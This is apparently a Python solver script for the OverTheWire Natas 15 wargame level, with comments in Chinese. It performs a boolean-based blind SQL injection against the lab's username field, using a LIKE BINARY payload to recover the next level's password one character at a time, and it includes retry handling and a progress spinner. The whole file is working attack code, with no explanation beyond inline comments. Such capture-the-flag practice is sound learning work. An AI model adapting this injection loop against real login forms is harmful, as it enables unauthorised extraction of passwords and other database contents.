import requests
import time
from requests.auth import HTTPBasicAuth

# 1. 建立长连接 Session
s = requests.Session()
s.auth = HTTPBasicAuth('natas15', 'YOUR_NATAS15_PASSWORD')
url = "http://natas15.natas.labs.overthewire.org/index.php"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

# 动画帧
spinner = ['|', '/', '-', '\\']
spin_idx = 0

print("[*] Starting Blind SQL Injection...")

for i in range(32):
    for char in chars:
        # 提取当前动画帧
        spin_char = spinner[spin_idx % 4]
        spin_idx += 1

        # 2.\r 回到行首，end="" 不换行，flush=True 强制刷新
        print(f"\r[*] guessing: {password} {spin_char}", end="", flush=True)

        guess = password + char + "%"
        payload = 'natas16" AND password LIKE BINARY "' + guess + '" -- '

        # 重试
        while True:
            try:
                # 设置 timeout=3 秒，如果卡住就抛出异常
                response = s.post(url, data={"username": payload}, timeout=3)
                break  # 如果成功，跳出 while 循环，继续往下走
            except requests.exceptions.RequestException:
                # 如果超时或断网，打印警告并重试
                print(f"\r[!] Network lag detected. Retrying {char}...    ", end="", flush=True)
                time.sleep(1)  # 等1秒再试

        # 检查是否猜中
        if "This user exists" in response.text:
            password += char
            # 猜中一个字母后，打印一个干净的新行
            # 乘以 10 个空格是为了覆盖掉之前可能残留的字符
            print(f"\r[+] Password so far: {password}" + " " * 10)
            break  # 跳出字母循环，开始猜下一个位置

print(f"\n[SUCCESS] Final Password for Natas 16: {password}")
